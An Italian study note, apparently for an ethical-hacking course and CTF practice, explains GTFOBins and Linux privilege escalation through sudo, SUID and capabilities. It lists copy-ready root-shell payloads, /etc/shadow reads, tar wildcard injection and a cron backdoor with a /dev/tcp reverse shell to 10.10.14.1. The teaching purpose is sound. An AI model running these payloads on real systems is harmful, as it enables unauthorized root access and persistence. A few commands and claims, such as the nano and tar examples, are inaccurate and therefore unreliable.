# GTFOBins

> [!abstract] In una frase **GTFOBins è un database crowdsourced di binari Unix/Linux "di sistema" e come abusarli** per ottenere RCE, reverse shell, bypass di autenticazione, o lettura/scrittura di file — **senza exploit ufficiali, solo funzionalità legittime della CLI**. È lo strumento essenziale di post-exploitation e privilege escalation.

> [!tip] Come usare questa nota GTFOBins non è una tecnica di exploitation, è un **catalogo di tecniche**. Questa nota spiega il **come cercarlo**, come **leggere una ricetta**, e il **perché funzionano**. Per ogni binario: _cosa fa → perché è abusabile → il payload_.

**Sito ufficiale**: https://gtfobins.github.io/

---

## 1. Cos'è GTFOBins

GTFOBins = **"Get The F*** Out Of Binaries"** (battuta su "Get Out Of Jail").

È un database pubblico e collaborativo che raccoglie:

- **Binari di sistema** comuni su Linux/Unix (`vim`, `bash`, `find`, `tar`, `less`, `nano`, `man`, `awk`, `sed`, ecc.)
- **Una o più tecniche per abusarli** (per ogni binario, spesso ci sono 5-10 varianti diverse)
- **Quando la tecnica funziona** (es. "solo se SUID", "solo in sudo", "sempre", "con input dall'attacker")

### Differenza cruciale: GTFOBins vs CVE exploit

|Aspetto|GTFOBins|CVE Exploit|
|---|---|---|
|**Cosa sfrutta**|Funzionalità **legittime** della CLI|Un **bug/vulnerability** specifico|
|**Dipendenza dalla versione**|**No** — funziona su tutte le versioni|**Sì** — solo quella versione vulnerabile|
|**Difficoltà di applicazione**|Banale (una riga di CLI)|Complesso (setup, trigger, timing)|
|**Probabilità di successo**|Altissima (95%+)|Media-bassa (dipende da protezioni)|
|**Rumorosità**|Silenziosa|Molto rumorosa (crash possibili)|
|**Legalità in CTF/lab**|Sempre consentito|Dipende dalle regole|

**Strategia di exploitation**: prova **prima GTFOBins**, poi CVE exploit se GTFOBins non dà risultati.

---

## 2. Leggere una "ricetta" GTFOBins

Quando accedi a https://gtfobins.github.io/g/vim/, vedi una pagina così:

### Esempio: VIM

```
Vim is an advanced text editor [...]

DESCRIPTION
  Advanced text editor.

CODE EXECUTION
  This requires the binary to be executed without restrictions in sudo.

SUDO  
  Code
  vim -c ':!/bin/sh' /dev/null

SUID  
  Code
  This doesn't apply to vim.

FILE READ
  Read data exfiltrated in stdout.

FILE WRITE
  Write data to files as root (if SUID/sudo).
```

**Anatomia di una ricetta**:

1. **Categoria** (SUDO, SUID, CAPABILITIES, LD_PRELOAD, FILE READ, FILE WRITE, REVERSE SHELL, etc.)
2. **Condizione** (quando funziona: "only if SUID", "requires stdin", etc.)
3. **Codice** (il payload esatto da copiare)
4. **Appunti** (warning, prerequisiti)

---

## 3. Categorie di abuse — quando usi GTFOBins

### 3.1 SUDO — il binario può essere eseguito come sudo senza password

**Scenario**: `sudo -l` mostra:

```
User user can run the following commands without password:
    (root) NOPASSWD: /usr/bin/vim
```

**Significa**: puoi lanciare `/usr/bin/vim` come root senza inserire password.

**Abuso via GTFOBins (Vim)**:

```bash
sudo vim -c ':!/bin/sh' /dev/null
```

All'apertura di vim come root, esegui il comando shell (`:!/bin/sh`) che spawna una `/bin/sh` con uid=0.

> [!success] Perché funziona Vim è uno **editor interattivo**: la flag `-c` esegue un comando vim prima di partire, e `:!` in vim esegue comandi shell. Combinazione legale di funzionalità = RCE come root.

### 3.2 SUID — il binario è SetUID root

**Scenario**: `find / -perm -4000 2>/dev/null` include `/usr/bin/find`.

**Abuso via GTFOBins (Find)**:

```bash
find . -exec /bin/sh -p \;
```

L'opzione `-exec` di find esegue un comando per ogni file trovato. Se find è SetUID root, quello `/bin/sh -p` parte come root (`-p` = preserve privileges su SUID).

> [!info] Perché -p? La flag `-p` su `/bin/sh` dice "non fare drop dei privilegi"; senza di essa, una shell SUID root che parte come utente normale fa automaticamente `setuid(user_id)` per motivi di sicurezza.

### 3.3 LD_PRELOAD — carica una libreria condivisa prima di tutto

**Scenario**: il binario è SUID **ma** puoi **controllare LD_PRELOAD** (raro, ma accade):

```bash
ld_preload=/tmp/libhax.so /suid_binary
```

GTFOBins spesso suggerisce di creare una `.so` maliziosa e preloadarla. Vedi [[Dynamic Linking]] § 7 per i dettagli.

> [!warning] Importante LD_PRELOAD **non funziona** su binari SUID per design di sicurezza. GTFOBins lo menziona per **binari normali** di cui controlli l'esecuzione (es. tramite injection in un servizio), non per SUID diretti. Per SUID, usa `/etc/ld.so.preload` (richiede già privilegi di root, quindi è post-exploitation).

### 3.4 FILE READ — leggere file come utente privilegiato

**Scenario**: un binario SUID ha la capacità di leggere file. Puoi leggerli come root.

**Abuso via GTFOBins (less)**:

```bash
# less è SUID root, può leggerlo chiunque
less /root/secret.txt
```

Poi in less: `:e /root/secret.txt` (apre file per editing) → vedrai il contenuto.

Oppure, direttamente:

```bash
less /etc/shadow    # leggi gli hash delle password come root
```

### 3.5 FILE WRITE — scrivere file come utente privilegiato

**Scenario**: un binario SUID può scrivere file. Scrivi file critici del sistema come root.

**Abuso via GTFOBins (tee)**:

```bash
echo "* * * * * /bin/sh -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'" | sudo tee -a /etc/cron.d/backdoor
```

Se `tee` è in sudo (o SUID), il crontab backdoor viene scritto come root.

### 3.6 REVERSE SHELL — spawna una reverse shell privilegiata

Combina RCE + reverse shell. Esempio (bash SUID, raro ma teoricamente possibile):

```bash
bash -p -i >& /dev/tcp/10.10.14.1/4444 0>&1
```

Se bash è SUID root, parte come root con `-p` → reverse shell come root.

### 3.7 CAPABILITIES — abusare di capacità Linux specifiche

**Scenario**: il binario ha capacità speciali (e.g., `cap_setuid`), non è SUID ma ha privilegi parziali.

```bash
getcap -r / 2>/dev/null     # trova binari con capabilities
```

GTFOBins ha sezioni per binari con capabilities — es., `cap_dac_override` su `tar` permette di leggere/scrivere file ovunque.

### 3.8 WILDCARD INJECTION — abusare di espansione wildcard

Vedi [[ETHL 0x06 — Hacking Unix p2]] § 1.4: cron script con wildcard espande nome-file che mimano opzioni.

GTFOBins non ha una sezione dedicata (è più un pattern di exploit), ma esempi con `tar`:

```bash
# nel cron: tar czf backup.tar.gz *
# tu crei:
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=backdoor.sh
```

Quando cron esegue tar, la wildcard espande ai tuoi file-opzione.

---

## 4. Workflow d'uso

### Passo 1: Enumera cosa puoi fare

```bash
sudo -l                                    # cosa in sudo?
find / -perm -4000 2>/dev/null             # quali SUID?
getcap -r / 2>/dev/null                    # capabilities?
```

### Passo 2: Per ogni risultato interessante, cerca in GTFOBins

```
https://gtfobins.github.io/g/vim/
https://gtfobins.github.io/g/find/
```

### Passo 3: Leggi la categoria rilevante

- È SUID? Cerca la sezione **SUID** della ricetta.
- È in sudo? Cerca **SUDO**.
- Vuoi leggere un file? Cerca **FILE READ**.

### Passo 4: Copia il payload e adattalo

Se la ricetta dice:

```bash
find . -exec /bin/sh -p \;
```

E tu sei in `/tmp`, esegui:

```bash
find /tmp -exec /bin/sh -p \;
```

Non sempre i payload sono "plug and play" — spesso servono adattamenti minimi.

---

## 5. Esempi concreti — i binari più comuni in CTF

### tar (SUID)

```bash
# Leggi file
tar xf archive.tar /etc/shadow -O

# Scrivi file (se permesso)
tar cf /dev/null /etc/passwd --transform='s,^,backdoor,'
```

### bash (SUID, raro ma accade)

```bash
bash -p -i     # shell interattiva come root (la flag -p impedisce drop)
```

### vim/nano (SUDO)

```bash
# Via editor: esegui comando shell
sudo vim -c ':!/bin/sh' /dev/null
sudo nano -c ':!/bin/sh' /dev/null

# O dentro l'editor:
# premi ESC, digita :!/bin/sh, premi Enter → shell
```

### less/more (SUID/FILE READ)

```bash
less /etc/shadow      # apri il file
# dentro less: v per edit (apre vim) → :!/bin/sh → shell
# O direttamente: ! esegui comandi shell
```

### find (SUID)

```bash
find . -exec /bin/bash -p \;     # spawn shell
find . -exec cat /etc/shadow \;  # leggi file
find . -exec touch /tmp/owned \;  # scrivi file
```

### awk/sed (SUID)

```bash
# awk può eseguire comandi
awk 'BEGIN {system("/bin/sh")}'

# sed con e flag può eseguire script
sed -e 's/^/echo owned /' /etc/hostname | sed -e 's/$//' | bash
```

### man (SUID, file read)

```bash
man /etc/shadow    # leggi il file tramite man pager
# dentro man: ! per eseguire comandi shell
```

### cp/mv (SUID, file write)

```bash
# copia file in giro come root
sudo cp /tmp/backdoor /etc/cron.d/
sudo mv /tmp/shell /usr/local/bin/
```

---

## 6. Differenza: abusare lo stesso binario in modi diversi

Lo stesso binario può avere **più vie di abuso** a seconda del contesto:

### Esempio: vim

**Se è in sudo** (`sudo -l` mostra vim):

```bash
sudo vim -c ':!/bin/sh'
```

**Se è SUID root** (raro):

```bash
vim -c ':!/bin/sh'     # apre shell come root direttamente
```

**Se è normale ma ha LD_PRELOAD** (molto raro):

```bash
LD_PRELOAD=/tmp/libhax.so vim
```

GTFOBins elenca tutte le vie; **tu scegli quella applicabile al tuo scenario**.

---

## 7. Limiti di GTFOBins

> [!warning] Non è una magic wand
> 
> 1. **Binario non in GTFOBins** → non esiste una ricetta pubblica. Potrebbe comunque essere abusabile, ma devi trovare il vettore da solo.
> 2. **Protections in place** → anche se la ricetta dice "SUID", se il kernel ha mitigazioni (es. ASLR, DEP), potrebbe non funzionare (raro, ma accade).
> 3. **Input required** → spesso la ricetta richiede di controllare input o argomenti del binario. Se non puoi controllarli, la tecnica fallisce.
> 4. **Shell restrictions** → su shell ristrette (`rbash`, `dash`), alcune tecniche di GTFOBins non funzionano.

---

## 8. GTFOBins vs LinPEAS

|Tool|Cosa fa|Quando usi|
|---|---|---|
|**GTFOBins**|Database di **tecniche di abuso per singoli binari**|Quando hai trovato un binario interessante (SUID/sudo) e vuoi sapere come abusarlo|
|**LinPEAS**|Script automatico che **enumera potenziali vettori**|Quando entri per la prima volta su una macchina e vuoi una lista rapida di PE possibili|

**Workflow realistico**:

1. Esegui **LinPEAS** → ottieni lista di SUID, sudo, cron, capabilities
2. Per ogni risultato interessante, vai su **GTFOBins** → copia il payload
3. Esegui il payload → PE

---

## 9. Trappole d'esame

> [!danger] Domande tipiche d'esame
> 
> 1. **Cos'è GTFOBins e perché è importante in PE?** → Database di abusi di binari legittimi, è il primo step dopo l'enumerazione.
> 2. **Differenza tra GTFOBins e CVE exploit?** → GTFOBins sfrutta funzionalità legittime (no versione-specificity), CVE un bug.
> 3. **Come leggi una ricetta GTFOBins?** → Categoria (SUDO/SUID/FILE READ) → condizione → payload.
> 4. **Quando usi SUDO vs SUID in GTFOBins?** → SUDO se il binario è in `sudo -l` senza password; SUID se ha il bit SetUID.
> 5. **Perché `-p` è importante su bash SUID?** → Impedisce che bash faccia automaticamente drop dei privilegi (setuid(user_id)).
> 6. **Come abusi vim/less/nano (editor)?** → `:!/bin/sh` per eseguire comandi shell, o apri file critici.
> 7. **Find exploitation — perché `-exec` funziona?** → find esegue comandi per ogni file; se find è SUID root, quei comandi partono come root.
> 8. **Wildcard injection con tar (GTFOBins)** → `--checkpoint-action=exec=cmd` è un'opzione legittima di tar; se crei file col nome che mima un'opzione, shell lo espande come opzione non come dato.
> 9. **Limite di GTFOBins** → non è garantito funzioni su protezioni modern; non include tutte le tecniche possibili.
> 10. **Quando usi LD_PRELOAD vs /etc/ld.so.preload?** → LD_PRELOAD per controllo di esecuzione (es. iniezione in servizio); /etc/ld.so.preload solo post-exploitation (richiede già privilegi di root).

---

## 10. Checklist: trovare il vettore

```
☐ sudo -l → qualcosa senza password?
  ☐ Vai su GTFOBins, sezione SUDO del binario
  ☐ Copia payload
  ☐ Esegui
  
☐ find / -perm -4000 → SUID interessanti (non su /bin/su, /usr/bin/passwd)?
  ☐ Vai su GTFOBins, sezione SUID
  ☐ Copia payload
  ☐ Esegui
  
☐ getcap -r / → capabilities interessanti (DAC_OVERRIDE, SETUID)?
  ☐ Vai su GTFOBins, sezione CAPABILITIES
  ☐ Copia payload
  ☐ Esegui
  
☐ Fallback: cercare cronjob, config, storia, core dump
  (vedi [[ETHL 0x06 — Hacking Unix p2]])
```

---

## 11. Richiamo attivo

> [!question] Verifica
> 
> 1. Cos'è GTFOBins in una frase?
> 2. Perché GTFOBins è più affidabile di CVE exploit per PE?
> 3. Come leggi una ricetta GTFOBins? (quali sezioni?)
> 4. Quando usi la sezione SUDO vs SUID?
> 5. Comando per trovare SUID binari e come li cerchi in GTFOBins.
> 6. Perché `-p` è necessario su bash SUID?
> 7. Come usi `find -exec` per abusare un SUID find?
> 8. Spiega il payload `vim -c ':!/bin/sh'` — cosa fa ogni parte.
> 9. Perché la wildcard injection con `tar` e `--checkpoint-action` funziona?
> 10. Due limiti reali di GTFOBins su sistemi moderni.

---

## 12. Workflow reale — esempio completo

```bash
# 1. Entro sulla macchina come utente 'user'
ssh user@target

# 2. Enumero
sudo -l
# Output: (root) NOPASSWD: /usr/bin/find

# 3. Vado su GTFOBins
# https://gtfobins.github.io/g/find/
# Trovo la sezione SUDO

# 4. Copia il payload
find . -exec /bin/sh -p \; -quit
# (-quit ferma find dopo il primo match)

# 5. Eseguo
find . -exec /bin/sh -p \; -quit
# # id
# uid=0(root) gid=0(root) → PE completata
```

---

> [!quote] Filosofia di GTFOBins **Non serve trovare exploit zero-day. Le funzionalità ordinarie di bin di sistema, combinate male, danno RCE/PE. Ricorda: il "bug" non è quasi mai nel singolo binario, è nella **configurazione di sistema** che permette a quel binario di fare danni (SUID non protetto, sudo troppo permissivo, cronjob scrivibile).**

---

**Related Notes**:

- [[ETHL 0x05 — Hacking Unix p1]] — SUID, SetUID, privilegi
- [[ETHL 0x06 — Hacking Unix p2]] — cronjob, wildcard injection, raccolta credenziali
- [[Dynamic Linking]] — LD_PRELOAD abuse
- [[HTB-Wall]] — esempi di GTFOBins in azione

**Status**: ✅ Completo **Last Updated**: 2026-06-14